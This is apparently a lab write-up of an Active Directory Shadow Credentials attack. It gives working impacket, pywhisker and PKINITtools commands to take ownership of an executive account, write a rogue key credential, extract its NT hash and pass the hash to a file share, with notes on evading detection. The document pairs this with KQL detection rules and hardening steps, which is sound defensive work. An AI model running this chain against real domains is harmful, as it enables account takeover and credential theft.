# Shadow Credentials: DACL Abuse to NT Hash Extraction

**Environment:** lab2019.local | DC: DC01 (192.168.1.4) | Attacker: Kali (192.168.1.218)  
**Starting foothold:** lowpriv / Passw0rd123!  
**Constraint:** No password change on target account  
**Objective:** Read flag from CTO_BRO-accessible share  

---

## The Misconfiguration

`lowpriv` is a member of `Managers`. `Managers` has `WriteOwner` over `CTO_BRO`. This is the entire attack surface — one delegated ACE on the wrong object.

BloodHound path:

```
LOWPRIV → MemberOf → MANAGERS → WriteOwner → CTO_BRO
```

---

## Why Shadow Credentials Instead of a Password Reset

`WriteOwner` → `dacledit FullControl` gives complete control over the target object's security descriptor. The obvious next step is a password reset. But:

- Password changes are logged and visible to the user and helpdesk
- A sudden password change on a C-suite account triggers immediate investigation
- The user is locked out until they notice and escalate

Shadow Credentials sidestep this entirely. `msDS-KeyCredentialLink` stores Windows Hello for Business certificate keys. Write your own certificate to this attribute and the KDC accepts it as proof of identity via PKINIT. You obtain a TGT, extract the NT hash via U2U, and authenticate as the target — without the password ever being read, changed, or expired.

From the target's perspective: nothing happened.

Legacy and on-prem MFA is irrelevant here. PKINIT authenticates via certificate, not the credential flow most MFA sits in front of.

---

## Tools

| Tool | Purpose |
|------|---------|
| `impacket-owneredit` | Transfer ownership of AD object to attacker-controlled account |
| `impacket-dacledit` | Write FullControl ACE to target object's DACL |
| `pywhisker` | Write attacker certificate to `msDS-KeyCredentialLink` |
| `gettgtpkinit.py` (PKINITtools) | Authenticate with certificate via PKINIT, obtain TGT |
| `getnthash.py` (PKINITtools) | Extract NT hash from TGT via U2U Kerberos exchange |
| `impacket-smbclient` | Pass-the-hash access to target resources |

---

## Pre-Attack Setup

```bash
# /etc/hosts
echo "192.168.1.4 DC01.lab2019.local lab2019.local" | sudo tee -a /etc/hosts

# Clean environment
unset KRB5CCNAME
rm -f *.pfx *.ccache dacledit-*.bak
```

---

## Phase 1 — Ownership Takeover

```bash
impacket-owneredit -action write -new-owner lowpriv -target CTO_BRO \
  -dc-ip 192.168.1.4 'lab2019.local/lowpriv:Passw0rd123!'
```

**What happens:** `lowpriv` exercises WriteOwner inherited via Managers membership. The `nTSecurityDescriptor` owner field on CTO_BRO changes from Domain Admins (`S-1-5-21-...-512`) to lowpriv (`S-1-5-21-...-1103`). Ownership implicitly permits DACL modification without a WriteDACL ACE.

**Expected output:**
```
[*] Current owner: Domain Admins
[*] OwnerSid modified successfully!
```

**Telemetry generated:**
- EID 4662 — WRITE_OWNER (AccessMask: 0x80000), SubjectUserName: lowpriv, ObjectClass: user

---

## Phase 2 — Grant FullControl

```bash
impacket-dacledit -action write -rights FullControl -principal lowpriv \
  -target CTO_BRO -dc-ip 192.168.1.4 'lab2019.local/lowpriv:Passw0rd123!'
```

**What happens:** An ACE is added to CTO_BRO's DACL granting lowpriv `CCDCLCSWRPWPDTLOCRSDRCWDWO` — every right including WriteProperty on all attributes, including `msDS-KeyCredentialLink`.

**Expected output:**
```
[*] DACL backed up to dacledit-<timestamp>.bak
[*] DACL modified successfully!
```

**Telemetry generated:**
- EID 4662 — WRITE_DAC (AccessMask: 0x40000), SubjectUserName: lowpriv
- EID 5136 — nTSecurityDescriptor Value Deleted/Added, ObjectDN: CN=CTO_BRO

---

## Phase 3 — Write Shadow Credential

```bash
pywhisker -d lab2019.local -u lowpriv -p 'Passw0rd123!' \
  --dc-ip 192.168.1.4 --target CTO_BRO --action add --filename cto_key
```

**What happens:** pywhisker generates a certificate keypair and writes the public key to `msDS-KeyCredentialLink` on CTO_BRO via LDAP. The DC will now accept this certificate as valid proof of CTO_BRO's identity for PKINIT authentication.

**Expected output:**
```
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: cto_key.pfx
[*] Must be used with password: <generated_password>
```

**Telemetry generated:**
- EID 5136 — msDS-KeyCredentialLink Value Added, AttributeLDAPDisplayName: msDS-KeyCredentialLink, SubjectUserName: lowpriv

---

## Phase 4 — PKINIT TGT Request

```bash
python3 ~/PKINITtools/gettgtpkinit.py lab2019.local/CTO_BRO \
  -cert-pfx cto_key.pfx -pfx-pass <pfx_password> cto.ccache
```

**What happens:** The KDC receives an AS-REQ with pre-authentication type 16 (PKINIT). It validates the certificate against the key stored in `msDS-KeyCredentialLink` and issues a TGT for CTO_BRO. Save the AS-REP encryption key from the output — required for Phase 5.

**Expected output:**
```
[*] AS-REP encryption key (you might need this later):
[*] <64-char hex key>
[*] Saved TGT to file
```

**Telemetry generated:**
- EID 4768 — PreAuthType: 16, CertIssuerName: CTO_BRO (self-signed, no CA), TargetUserName: CTO_BRO, ClientAddress: Kali IP

---

## Phase 5 — NT Hash Extraction via U2U

```bash
export KRB5CCNAME=$(pwd)/cto.ccache
python3 ~/PKINITtools/getnthash.py lab2019.local/CTO_BRO -key <AS-REP_key>
```

**What happens:** getnthash requests a service ticket from CTO_BRO to CTO_BRO (U2U). Because the TGT was obtained via PKINIT, the PAC in the service ticket contains the NT hash encrypted with the AS-REP session key. The tool decrypts it using the key captured in Phase 4.

**Expected output:**
```
[*] Requesting ticket to self with PAC
Recovered NT Hash
<32-char hex hash>
```

**Telemetry gap:** EID 4769 (Kerberos service ticket request) was not generated for the U2U exchange despite Kerberos Service Ticket Operations auditing being enabled (`Success and Failure`). The U2U exchange in getnthash does not consistently surface as a 4769 on all DC configurations. This is a documented blind spot.

---

## Phase 6 — Pass-the-Hash

```bash
impacket-smbclient lab2019.local/CTO_BRO@DC01.lab2019.local \
  -hashes :<NT_hash> -no-pass
```

```
# use CTOFiles
# cat flag.txt
Shadow_Creds_CEO_Pwned
```

CTO_BRO's password was never known, changed, or expired.

---

## Detection: ELK / Kibana Rules

### Prerequisites

**Winlogbeat config — Security event IDs required:**
```yaml
winlogbeat.event_logs:
  - name: Security
    event_id: 4662, 4768, 4769, 5136
```

**DC audit policy:**
```cmd
auditpol /set /subcategory:"Directory Service Changes" /success:enable
auditpol /set /subcategory:"Directory Service Access" /success:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable
```

**SACL requirement:** 5136 and 4662 will NOT fire without a SACL on the target AD object. Audit policy alone is insufficient. Set a SACL on CTO_BRO (or all privileged user objects) via ADUC → Advanced → Auditing:
- Principal: Everyone
- Type: Success
- Permissions: Write all properties, Modify permissions, Modify owner

---

### Rule 1 — WRITE_OWNER on AD User Object (Phase 1)

**Severity:** High | **Risk Score:** 73  
**MITRE:** TA0004 Privilege Escalation / T1484 Domain or Tenant Policy Modification

**Description:** A standard domain user taking ownership of another AD user object has no legitimate use case. This is Phase 1 of a DACL abuse chain — ownership transfer is required before DACL modification can proceed without an explicit WriteDACL ACE.

```kql
event.code: "4662" and
winlog.event_data.AccessMask: "0x80000" and
winlog.event_data.SubjectUserName: * and
not winlog.event_data.SubjectUserName: (*$ or SYSTEM or Administrator)
```

---

### Rule 2 — WRITE_DAC on AD User Object (Phase 2)

**Severity:** High | **Risk Score:** 73  
**MITRE:** TA0004 Privilege Escalation / T1484 Domain or Tenant Policy Modification

**Description:** A non-privileged account has modified the DACL on an AD user object. Follows WRITE_OWNER within the same logon session. Grants attacker FullControl over the target object including write access to `msDS-KeyCredentialLink`.

```kql
event.code: "4662" and
winlog.event_data.AccessMask: "0x40000" and
not winlog.event_data.SubjectUserName: (*$ or SYSTEM or Administrator)
```

---

### Rule 3 — msDS-KeyCredentialLink Written by Non-Machine Account (Phase 3)

**Severity:** Critical | **Risk Score:** 99  
**MITRE:** TA0006 Credential Access / T1556 Modify Authentication Process

**Description:** A user account has written to `msDS-KeyCredentialLink` on an AD user object. This attribute stores Windows Hello for Business public keys and should only be written by domain controllers during WHfB enrollment. A user account writing to this attribute has zero legitimate use cases in a standard environment. Zero expected false positives in a non-WHfB environment. This is the highest-confidence detection in the chain.

```kql
event.code: "5136" and
winlog.event_data.AttributeLDAPDisplayName: "msDS-KeyCredentialLink" and
winlog.event_data.OperationType: "%%14674" and
not winlog.event_data.SubjectUserName: *$
```

Note: `%%14674` is the Windows constant for "Value Added" in 5136 events — confirmed in live telemetry.

---

### Rule 4 — PKINIT TGT with Self-Signed Certificate (Phase 4)

**Severity:** Critical | **Risk Score:** 99  
**MITRE:** TA0006 Credential Access / T1558 Steal or Forge Kerberos Tickets

**Description:** A TGT was requested via certificate-based pre-authentication (Pre-Auth Type 16) where the certificate issuer matches the requesting account name, indicating a self-signed certificate not issued by any PKI infrastructure in the environment. Legitimate PKINIT authentication uses certificates issued by an enterprise CA, not self-signed certificates.

```kql
event.code: "4768" and
winlog.event_data.PreAuthType: "16" and
winlog.event_data.CertIssuerName: * and
not winlog.event_data.CertIssuerName: ("" or "-") and
not winlog.event_data.TargetUserName: *$
```

---

### Rule 5 — U2U Service Ticket (Phase 5) — Detection Gap

**Intent:** Detect EID 4769 where ServiceName equals TargetUserName (user requesting ticket to itself). No legitimate use case. Reliable indicator of NT hash extraction via PKINITtools.

**Status:** Not validated. The U2U exchange in getnthash.py did not generate EID 4769 in this lab despite Kerberos Service Ticket Operations auditing being enabled (`Success and Failure`). This appears to be DC-configuration-dependent behaviour. Treat Phase 5 as a current blind spot.

**KQL (unvalidated):**
```kql
event.code: "4769" and
winlog.event_data.ServiceName: * and
winlog.event_data.TargetUserName: * and
not winlog.event_data.ServiceName: (*$ or krbtgt)
```

Note: KQL does not support direct field-to-field comparison. The service name = account name correlation requires EQL or a threshold rule in production.

---

## Why This Gets Missed

- Directory Service Changes auditing is disabled by default on most DCs
- Even when enabled, 4662 and 5136 only fire if the target object has a SACL — audit policy alone is insufficient
- Most SIEM rules watch for DCSync and Kerberoasting; DACL manipulation on user objects is a blind spot
- No attacker code runs on the DC — pure LDAP writes and Kerberos exchanges on the wire
- CTO_BRO's password is never changed — no password change alert, no user complaint, no helpdesk ticket

---

## Hardening

- Set a SACL on all privileged user objects auditing Write all properties, Modify permissions, Modify owner
- Alert on any 5136 where a non-DC account writes to `msDS-KeyCredentialLink`
- Alert on 4768 with Pre-Auth Type 16 from non-machine, non-service accounts
- Add high-value accounts to the Protected Users group — prevents NTLM, forces Kerberos AES
- Run BloodHound regularly — the Managers → WriteOwner → CTO_BRO ACE is the root cause
- Implement a tiered admin model: delegated rights should never reach sensitive user objects via flat group membership

---

## References

- [Shadow Credentials — SpecterOps](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [pywhisker](https://github.com/ShutdownRepo/pywhisker)
- [PKINITtools](https://github.com/dirkjanm/PKINITtools)
- [impacket](https://github.com/fortra/impacket)


<img width="1877" height="952" alt="KIBANA" src="https://github.com/user-attachments/assets/7ac70133-c9a3-40e2-b412-b069a9f7a254" />

<img width="1744" height="299" alt="proofnoaccesslowprivbefore" src="https://github.com/user-attachments/assets/fd7763db-c60b-48ff-98b6-9e72e6ec4132" />

<img width="990" height="135" alt="grantfullcontrol" src="https://github.com/user-attachments/assets/019a5591-68cf-4f82-8bd0-3c5dceaefab7" />

<img width="902" height="200" alt="Takeownership" src="https://github.com/user-attachments/assets/4a889d25-0207-432e-b274-b463642e634a" />

<img width="1100" height="265" alt="WriteShadowCred" src="https://github.com/user-attachments/assets/7aad275c-d60a-4ee0-acc7-339ec2036c6c" />

<img width="1244" height="249" alt="pkinittgt" src="https://github.com/user-attachments/assets/13f38a4a-f013-4f9d-b2dd-993f93f5d560" />

<img width="1442" height="179" alt="extractnthash" src="https://github.com/user-attachments/assets/06b51b75-4b01-46b2-8d5c-1701d757c20e" />

<img width="1166" height="395" alt="PTH" src="https://github.com/user-attachments/assets/13031e83-3eb3-414e-9842-f2e0d3435de4" />






